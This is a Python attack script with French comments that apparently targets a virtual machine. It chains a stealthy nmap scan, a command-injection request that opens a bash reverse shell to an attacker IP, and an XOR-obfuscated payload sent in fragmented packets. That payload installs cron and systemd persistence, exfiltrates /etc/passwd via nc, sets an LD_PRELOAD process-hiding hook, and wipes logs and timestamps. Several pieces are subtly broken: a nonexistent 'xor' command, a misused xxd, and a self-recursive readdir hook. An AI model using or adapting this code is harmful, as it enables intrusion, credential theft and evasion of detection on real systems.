import scapy.all as scapy
import socket
import time
import random
import base64
import subprocess
import os

# Configuration
target_ip = "<VM_IP>"  # Remplacer par l'IP de la VM
target_port = 80  # Port HTTP (ajuster selon le service)
attacker_ip = "192.168.1.100"  # IP de l'attaquant
attacker_port = 4444
exfil_port = 4445

# Fonction 1 : Scan réseau furtif
def network_scan():
    print("Lancement du scan réseau...")
    subprocess.run(["nmap", "-sS", "-A", "-p-", "--randomize-ports", "--randomize-hosts", "--source-ip", "192.168.1.254", target_ip], timeout=180)
    print("Scan terminé. Port cible identifié.")

# Fonction 2 : Exploitation via command injection
def command_injection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        # Payload pour shell inversé
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 100\r\n"
            b"\r\n"
            b"cmd=bash -c 'bash -i >& /dev/tcp/" + attacker_ip.encode() + b"/" + str(attacker_port).encode() + b" 0>&1'\r\n"
        )
        s.send(payload)
        response = s.recv(1024)
        print(f"Response: {response.decode(errors='ignore')}")
        s.close()
    except Exception as e:
        print(f"Erreur lors de l'injection: {e}")

# Fonction 3 : Installation du rootkit avec LD_PRELOAD
def install_rootkit():
    try:
        # Bibliothèque LD_PRELOAD pour masquer les processus
        hide_so = (
            "#include <dirent.h>\n"
            "#include <string.h>\n"
            "struct dirent *readdir(DIR *dir) {\n"
            "    struct dirent *res;\n"
            "    while ((res = readdir(dir))) {\n"
            "        if (strcmp(res->d_name, \"malicious\") == 0) continue;\n"
            "        return res;\n"
            "    }\n"
            "    return NULL;\n"
            "}\n"
        ).encode()
        # Payload rootkit : persistance, C2, infection, exfiltration
        malicious_script = (
            "#!/bin/bash\n"
            f"echo '* * * * * root bash -c \"cat /etc/passwd | base64 | nc {attacker_ip} {exfil_port}\"' >> /etc/crontab\n"
            "echo '[Unit]\nDescription=Malicious\n[Service]\nExecStart=/tmp/malicious.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/malicious.service\n"
            f"echo '{base64.b64encode(hide_so).decode()}' | base64 -d > /tmp/hide.c\n"
            "gcc -shared -fPIC /tmp/hide.c -o /tmp/hide.so\n"
            "echo 'export LD_PRELOAD=/tmp/hide.so' >> /etc/profile\n"
            "echo 'infected' > /bin/ps\n"
            "echo 'malicious' > /tmp/malicious.sh\n"
            "chmod +x /tmp/malicious.sh\n"
            "echo '' > /var/log/syslog\n"
            "touch -r /bin/ls /bin/ps\n"  # Masquer les horodatages
        ).encode()
        # XOR encoding pour obfuscation
        xor_key = random.randint(1, 255)
        xor_payload = bytes(b ^ xor_key for b in malicious_script)
        encoded_payload = base64.b64encode(xor_payload).decode()
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(encoded_payload) + 50).encode() + b"\r\n"
            b"\r\n"
            b"cmd=echo " + encoded_payload.encode() + b" | base64 -d | xxd -r -p | bash -c 'cat | xor " + str(xor_key).encode() + b" | bash'\r\n"
        )
        # Envoyer via paquets fragmentés
        ip = scapy.IP(dst=target_ip, flags="MF", frag=0)
        tcp = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="PA")
        fragments = scapy.fragment(ip / tcp / payload, fragsize=6)
        for frag in fragments:
            scapy.send(frag, verbose=0)
            time.sleep(random.uniform(0.02, 0.05))
    except Exception as e:
        print(f"Erreur lors de l'installation du rootkit: {e}")

# Exécuter l'exploit
if __name__ == "__main__":
    print("Démarrage de l'exploit...")
    network_scan()
    print("Tentative d'injection de commande...")
    command_injection()
    print("Installation du rootkit et exfiltration...")
    for _ in range(5):
        install_rootkit()
        time.sleep(random.uniform(0.1, 0.3))
    print("Exploit terminé.")